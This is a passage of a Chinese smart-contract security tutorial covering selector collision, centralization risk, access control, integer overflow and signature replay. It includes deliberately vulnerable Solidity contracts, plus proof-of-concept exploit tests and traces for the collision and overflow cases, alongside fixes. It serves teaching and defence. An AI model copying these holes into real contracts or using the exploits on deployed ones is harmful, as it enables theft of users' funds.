<p>那一天下午，<code>0xAA</code>路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function peopleLduohW(uint256)&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语再次被猜中后，斯芬克斯气急败坏，脚下一打滑就从巍峨的峭崖上掉下去摔死了。</p>
<p><img src="/img/web3/S02-2.png" srcset="/img/loading.gif" lazyload alt="S02-2"></p>
<h2 id="漏洞合约例子-1"><a href="#漏洞合约例子-1" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><p>下面我们来看一下有漏洞的合约例子。<code>SelectorClash</code>合约有<code>1</code>个状态变量 <code>solved</code>，初始化为<code>false</code>，攻击者需要将它改为<code>true</code>。合约主要有<code>2</code>个函数，函数名沿用自 Poly Network 漏洞合约。</p>
<ol>
<li><code>putCurEpochConPubKeyBytes()</code> ：攻击者调用这个函数后，就可以将<code>solved</code>改为<code>true</code>，完成攻击。但是这个函数检查<code>msg.sender == address(this)</code>，因此调用者必须为合约本身，我们需要看下其他函数。</li>
<li><code>executeCrossChainTx()</code> ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为<code>(bytes)</code>，而这里调用的函数参数为<code>(bytes,bytes,uint64)</code>。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.10;<br><br>contract SelectorClash &#123;<br>    bool public solved; // 攻击是否成功<br><br>    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。<br>    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;<br>        require(msg.sender == address(this), &quot;Not Owner&quot;);<br>        solved = true;<br>    &#125;<br><br>    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。<br>    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;<br>        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>我们的目标是利用<code>executeCrossChainTx()</code>函数调用合约中的<code>putCurEpochConPubKeyBytes()</code>，目标函数的选择器为：<code>0x41973cd9</code>。观察到<code>executeCrossChainTx()</code>中是利用<code>_method</code>参数和<code>&quot;(bytes,bytes,uint64)&quot;</code>作为函数签名计算的选择器。因此，我们只需要选择恰当的<code>_method</code>，让这里算出的选择器等于<code>0x41973cd9</code>，通过选择器碰撞调用目标函数。</p>
<p>Poly Network黑客事件中，黑客碰撞出的<code>_method</code>为 <code>f1121318093</code>，即<code>f1121318093(bytes,bytes,uint64)</code>的哈希前<code>4</code>位也是<code>0x41973cd9</code>，可以成功的调用函数。接下来我们要做的就是将<code>f1121318093</code>转换为<code>bytes</code>类型：<code>0x6631313231333138303933</code>，然后作为参数输入到<code>executeCrossChainTx()</code>中。<code>executeCrossChainTx()</code>函数另<code>3</code>个参数不重要，填 <code>0x</code>, <code>0x</code>, <code>0</code> 就可以。</p>
<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="&#96;&#96;演示"></a>&#96;&#96;演示</h2><ol>
<li>部署<code>SelectorClash</code>合约。</li>
<li>调用<code>executeCrossChainTx()</code>，参数填<code>0x6631313231333138303933</code>，<code>0x</code>，<code>0x</code>，<code>0</code>，发起攻击。</li>
<li>查看<code>solved</code>变量的值，被修改为<code>true</code>，攻击成功。</li>
</ol>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract SelectorClashTest is Test &#123;<br>    SelectorClash private selector;<br>    function setUp() public &#123;<br>        selector = new SelectorClash();<br>    &#125;<br>    function test_selector() public &#123;<br>        bool Before=selector.solved();<br>        console.log(&quot;selector.solved Before is  &quot;,Before);<br>        bytes memory _method=&quot;0x6631313231333138303933&quot;;<br><br>        bool success = selector.executeCrossChainTx(<br>            hex&quot;6631313231333138303933&quot;, // bytes param1<br>            &quot;&quot;,                         // bytes param2<br>            &quot;&quot;,                         // bytes param3<br>            0                           // uint256 param4<br>        );<br>        bool After=selector.solved();<br>        console.log(&quot;selector.solved After is  &quot;,After);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>Logs:<br>  selector.solved Before is   false<br>  selector.solved After is   true<br><br>Traces:<br>  [41344] SelectorClashTest::test_selector()<br>    ├─ [2487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] false<br>    ├─ [0] console::log(&quot;selector.solved Before is  &quot;, false) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26267] SelectorClash::executeCrossChainTx(0x6631313231333138303933, 0x, 0x, 0)<br>    │   ├─ [21125] SelectorClash::putCurEpochConPubKeyBytes(0x)<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Return] true<br>    ├─ [487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] true<br>    ├─ [0] console::log(&quot;selector.solved After is  &quot;, true) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<h1 id="S03-中心化风险"><a href="#S03-中心化风险" class="headerlink" title="S03 中心化风险"></a>S03 中心化风险</h1><p>伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。</p>
<p>近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在 2022 年 3 月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万 USDC。此外，在 2023 年 8 月 1 日，PEPE 多重签名钱包将阈值从<code>5/8</code>更改为仅<code>2/8</code>，并从多签地址转出大量 PEPE，这也是伪去中心化的体现。</p>
<p><code>Harmony</code>公链的跨链桥在 2022 年 6 月被盗 1 亿美元。<code>Harmony</code>桥由 5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空</p>
<h2 id="漏洞合约例子-2"><a href="#漏洞合约例子-2" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>有中心化风险的合约多种多样，这里只举一个最常见的例子：<code>owner</code>地址可以任意铸造代币的<code>ERC20</code>合约。当项目内鬼或黑客取得<code>owner</code>的私钥后，可以无限铸币，造成投资人大量损失。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br><br>contract Centralization is ERC20, Ownable &#123;<br>    constructor() ERC20(&quot;Centralization&quot;, &quot;Cent&quot;) &#123;<br>        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;<br>        transferOwnership(exposedAccount);<br>    &#125;<br><br>    function mint(address to, uint256 amount) external onlyOwner&#123;<br>        _mint(to, amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="如何减少中心化-伪去中心化风险？"><a href="#如何减少中心化-伪去中心化风险？" class="headerlink" title="如何减少中心化&#x2F;伪去中心化风险？"></a>如何减少中心化&#x2F;伪去中心化风险？</h2><ol>
<li>使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4&#x2F;7 或 6&#x2F;9 多签。如果你不了解多签钱包，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/50_MultisigWallet/readme.md">WTF Solidity 第 50 讲：多签钱包</a>。</li>
<li>多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。</li>
<li>使用时间锁控制合约，在黑客或项目内鬼修改合约参数&#x2F;盗取资产时，项目方和社区有一些时间来应对，将损失最小化。如果你不了解时间锁合约，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/45_Timelock/readme.md">WTF Solidity 第 45 讲：时间锁</a>。</li>
</ol>
<h1 id="S04-权限管理漏洞"><a href="#S04-权限管理漏洞" class="headerlink" title="S04. 权限管理漏洞"></a>S04. 权限管理漏洞</h1><p>智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。下面我们介绍两种常见的权限管理漏洞。</p>
<p>在下面的代码中，<code>mint()</code>函数没有进行权限管理，那么任何人都可以调用它铸造代币。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的mint函数，没有限制权限<br>function badMint(address to, uint amount) public &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="2-授权检查错误"><a href="#2-授权检查错误" class="headerlink" title="2. 授权检查错误"></a>2. 授权检查错误</h3><p>另一类常见的权限管理漏洞是没有在函数中检查调用者是否拥有足够的授权。BSC上DeFi项目 ShadowFi 的代币合约忘了在 <code>burn()</code> 销毁函数中检查调用者的授权额度，导致攻击者可以任意的销毁其他地址的代币。在黑客将流动性池子中的代币销毁之后，仅需卖出一点代币就可以将池子里的所有 <code>BNB</code> 提走，获利 $300,000。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的burn函数，没有限制权限<br>function badBurn(address account, uint amount) public &#123;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>权限管理漏洞主要有两种预防办法：</p>
<ol>
<li>使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限，比如使用<code>OnlyOwner</code>修饰器，只有合约所有者才能调用。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的mint函数，使用 onlyOwner 修饰器限制权限<br>function goodMint(address to, uint amount) public onlyOwner &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>



<ol>
<li>在函数的逻辑中确保合约调用者拥有足够的授权。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的burn函数，如果销毁的不是自己的代币，则会检查授权<br>function goodBurn(address account, uint amount) public &#123;<br>    if(msg.sender != account)&#123;<br>        _spendAllowance(account, msg.sender, amount);<br>    &#125;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="S05-整型溢出"><a href="#S05-整型溢出" class="headerlink" title="S05. 整型溢出"></a>S05. 整型溢出</h1><p>整型溢出漏洞（Arithmetic Over&#x2F;Under Flows）。这是一个比较经典的漏洞，Solidity 0.8版本后内置了Safemath库，因此很少发生</p>
<p>以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 <code>uint8</code>，只能表示 [0,255] 范围内的数字。如果给 <code>uint8</code> 类型变量的赋值 <code>257</code>，则会上溢（overflow）变为 <code>1</code>；如果给它赋值<code>-1</code>，则会下溢（underflow）变为<code>255</code>。</p>
<p>攻击者可以利用这个漏洞进行攻击：想象一下，黑客余额为<code>0</code>，他凭空花 <code>$1</code> 之后，余额突然变成了 <code>$2^256-1</code>。2018年的土狗项目 <code>PoWHC</code> 因为这个漏洞被盗了 <code>866 ETH</code>。</p>
<p><img src="/img/web3/S05-1.png" srcset="/img/loading.gif" lazyload alt="S05-1"></p>
<h2 id="漏洞合约例子-3"><a href="#漏洞合约例子-3" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面这个例子是一个简单的代币合约，参考了 <code>Ethernaut</code> 中的合约。它有 <code>2</code> 个状态变量：<code>balances</code> 记录了每个地址的余额，<code>totalSupply</code> 记录了代币总供给。</p>
<p>它有 <code>3</code> 个函数：</p>
<ul>
<li>构造函数：初始化代币总供给。</li>
<li><code>transfer()</code>：转账函数。</li>
<li><code>balanceOf()</code>：查询余额函数。</li>
</ul>
<p>由于solidity <code>0.8.0</code> 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 <code>unchecked</code> 关键字，在代码块中临时关掉溢出检查，就像我们在 <code>transfer()</code> 函数中做的那样。</p>
<p>这个例子中的漏洞就出现在<code>transfer()</code> 函数中，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>contract Token &#123;<br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br>  <br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    unchecked&#123;<br>        require(balances[msg.sender] - _value &gt;= 0);<br>        balances[msg.sender] -= _value;<br>        balances[_to] += _value;<br>    &#125;<br>    return true;<br>  &#125;<br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract TokenTest is Test &#123;<br>    Token private token;<br>    function setUp() public &#123;<br>        uint initialSupply = 100;<br>        token = new Token(initialSupply);<br>    &#125;<br><br>    function test_transfer() public &#123;<br>        uint Before = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf Before is  &quot;, Before);<br>        bool success = token.transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000);<br>        uint After = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf After is  &quot;, After);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="测试结果：变成了一个很大的数字"><a href="#测试结果：变成了一个很大的数字" class="headerlink" title="测试结果：变成了一个很大的数字"></a>测试结果：变成了一个很大的数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  token.balanceOf Before is   100<br>  token.balanceOf After is   115792089237316195423570985008687907853269984665640564039457584007913129639036<br><br>Traces:<br>  [42015] TokenTest::test_transfer()<br>    ├─ [2828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 100<br>    ├─ [0] console::log(&quot;token.balanceOf Before is  &quot;, 100) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26393] Token::transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000)<br>    │   └─ ← [Return] true<br>    ├─ [828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]<br>    ├─ [0] console::log(&quot;token.balanceOf After is  &quot;, 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<h2 id="预防办法-1"><a href="#预防办法-1" class="headerlink" title="预防办法"></a>预防办法</h2><ol>
<li>Solidity <code>0.8.0</code> 之前的版本，在合约中引用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/utils/math/SafeMath.sol">Safemath 库</a>，在整型溢出时报错。</li>
<li>Solidity <code>0.8.0</code> 之后的版本内置了 <code>Safemath</code>，因此几乎不存在这类问题。开发者有时会为了节省gas使用 <code>unchecked</code> 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。</li>
</ol>
<h1 id="S06-签名重放"><a href="#S06-签名重放" class="headerlink" title="S06. 签名重放"></a>S06. 签名重放</h1><p>上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。</p>
<p>数字签名一般有两种常见的重放攻击：</p>
<ol>
<li>普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。</li>
<li>跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。</li>
</ol>
<p><img src="/img/web3/S06-1.png" srcset="/img/loading.gif" lazyload alt="S06-1"></p>
<h2 id="漏洞合约例子-4"><a href="#漏洞合约例子-4" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面的<code>SigReplay</code>合约是一个<code>ERC20</code>代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 <code>to</code> 铸造相应数量 <code>amount</code> 的代币。合约中保存了 <code>signer</code> 地址，来验证签名是否有效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br>import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;<br><br>// 权限管理错误例子<br>contract SigReplay is ERC20 &#123;<br><br>    address public signer;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;<br>        signer = msg.sender;<br>    &#125;<br>    <br>    /**<br>     * 有签名重放漏洞的铸造函数<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b<br>     */<br>    function badMint(address to, uint amount, bytes memory signature) public &#123;<br>        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be<br>     */<br>    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;<br>        return keccak256(abi.encodePacked(to, amount));<br>    &#125;<br><br>    /**<br>     * @dev 获得以太坊签名消息<br>     * `hash`：消息哈希 <br>     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]<br>     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`<br>     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。<br>     */<br>    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;<br>        // 32 is the length in bytes of hash,<br>        // enforced by the type signature above<br>        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));<br>    &#125;<br><br>    // ECDSA验证<br>    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;<br>        return ECDSA.recover(_msgHash, _signature) == signer;<br>    &#125;<br></code></pre></td></tr></table></figure>



<p><strong>注意</strong> 铸造函数 <code>badMint()</code> 没有对 <code>signature</code> 查重，导致同样的签名可以多次使用，无限铸造代币。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function badMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="预防办法-2"><a href="#预防办法-2" class="headerlink" title="预防办法"></a>预防办法</h2><p>签名重放攻击主要有两种预防办法：</p>
<ol>
<li><p>将使用过的签名记录下来，比如记录下已经铸造代币的地址 <code>mintedAddress</code>，防止签名反复使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(address =&gt; bool) public mintedAddress;   // 记录已经mint的地址<br><br>function goodMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    // 检查该地址是否mint过<br>    require(!mintedAddress[to], &quot;Already minted&quot;);<br>    // 记录mint过的地址<br>    mintedAddress[to] = true;<br>    _mint(to, amount);<br>&#125;<br>```solidity<br></code></pre></td></tr></table></figure>


</li>
<li><p>将 <code>nonce</code> （数值随每次交易递增）和 <code>chainid</code> （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint nonce;<br><br>function nonceMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>    nonce++;<br>&#125;<br></code></pre></td></tr></table></figure>


</li>
<li><p>对于由用户输入<code>signature</code>的场景，需要检验<code>signature</code>的长度，确保其长度为<code>65bytes</code>，否则也会产生签名重放问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address to, uint amount, bytes memory signature) public &#123;<br>    require(signature.length == 65, &quot;Invalid signature length&quot;);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>一、签名重放攻击概念</p>
<p>1.定义</p>
<ul>
<li>攻击者截获有效签名</li>
<li>多次重复使用同一签名</li>
<li>非法执行授权操作</li>
</ul>
<p>2.典型攻击场景</p>
<ul>
<li>转账授权</li>
<li>特权操作</li>
<li>资产交易</li>
<li>权限验证</li>
</ul>
<p>四、最佳实践</p>
<p>1.始终使用Nonce<br>2.添加过期时间<br>3.使用域分隔符<br>4.限制签名使用次数<br>5.严格验证签名参数</p>
<p>五、常见错误</p>
<p>1.重用Nonce<br>2.没有过期机制<br>3.签名验证不严格<br>4.未限制签名范围</p>
<p>六、推荐库</p>
<p>1.OpenZeppelin</p>
<ul>
<li>提供安全签名工具</li>
<li>标准化实现</li>
</ul>
<p>2.EIP-712实现</p>
<ul>
<li>安全的签名标准</li>
<li>跨链兼容</li>
</ul>
